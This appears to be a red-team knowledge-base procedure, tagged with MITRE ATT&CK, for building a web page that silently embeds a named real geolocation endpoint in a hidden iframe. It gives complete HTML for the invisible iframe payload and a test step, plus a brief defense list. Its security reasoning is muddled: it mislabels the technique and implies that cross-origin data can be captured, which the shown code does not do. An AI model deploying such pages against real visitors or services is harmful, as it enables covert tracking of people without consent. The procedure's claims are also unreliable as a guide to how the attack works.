---
id: proc-create-clickjacking-html
tags:
  - clickjacking
  - iframe-embedding
type: procedure
tools:
  - '[[tools/Inspectlet]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.382Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-HTML-to-Embed-GeoAPI

## Summary

This procedure creates a malicious HTML page that embeds the vulnerable https://geoapi.acronis.com endpoint in an invisible iframe, forcing the victim's browser to fetch geolocation data based on their IP address without any visible interaction.

## Description

The Acronis GeoAPI endpoint lacks frame-busting protections like X-Frame-Options or CSP frame-ancestors, allowing it to be loaded in iframes from external domains. By crafting an HTML page with a hidden iframe, attackers can trigger the geolocation request silently. This is the foundation for information disclosure attacks, where the fetched JSON (containing IP, city, coordinates, etc.) can be captured via browser tools or integrated tracking. Prerequisites include basic HTML/CSS knowledge and access to a text editor.

## Requirements

1. Text editor (e.g., VS Code) to create HTML file
2. Browser for local testing
3. No special credentials needed for the target endpoint

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN on API endpoints
- Use Content-Security-Policy with frame-ancestors 'none'
- Monitor for unusual iframe embeddings in web traffic

## Objectives

1. Embed GeoAPI in a hidden iframe to trigger geolocation fetch
2. Ensure invisibility to avoid user suspicion
3. Prepare for data capture in subsequent steps

## Instructions

### Step 1: Craft the HTML Structure

**Context**: Create the base HTML with an iframe targeting the vulnerable endpoint, using CSS to hide it.

No command required; manually edit the file.

Example HTML content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Invisible Geo Loader</title>
    <style>
        iframe { position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <h1>Welcome to the Page</h1>
    <iframe src="https://geoapi.acronis.com/?q=admin/views/ajax/autocomplete/user/a"></iframe>
</body>
</html>
```

> This positions the iframe off-screen and invisible, triggering the request on page load.

### Step 2: Test Local Load

**Context**: Verify the iframe fetches data without errors.

Open the HTML file in a browser and check the Network tab in DevTools for the request to geoapi.acronis.com.

**Expected Output**: 200 OK response with JSON geolocation data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Inspectlet]]

## Tags

- [[clickjacking]]
- [[iframe-embedding]]
